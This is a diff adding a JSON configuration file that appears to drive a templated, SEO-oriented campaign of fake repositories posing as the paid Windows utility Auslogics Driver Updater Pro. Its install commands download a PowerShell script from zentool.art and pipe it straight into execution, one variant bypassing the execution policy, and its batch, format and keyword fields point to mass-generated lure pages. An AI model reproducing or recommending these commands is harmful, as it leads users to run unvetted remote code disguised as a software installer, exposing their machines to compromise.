@@ -1,0 +1,28 @@
+{
+  "repo": "Auslogics-Driver-Updater-Pro",
+  "product": "Auslogics-Driver-Updater-Pro",
+  "product_title": "Auslogics Driver Updater Pro",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_url": "https://zentool.art/",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "health_url": "https://zentool.art/health",
+  "batch": "115-zentool-mylunora",
+  "format": "license-md-geogit-v5-paraphrase-seo",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "auslogics-driver-updater",
+    "auslogics-app",
+    "auslogics-driver-updater-app",
+    "desktop-utility",
+    "windows-tools",
+    "how-to-install-auslogics",
+    "how-to-setup-auslogics",
+    "desktop-package",
+    "windows-11",
+    "windows-10"
+  ],
+  "site": "zentool.art"
+}
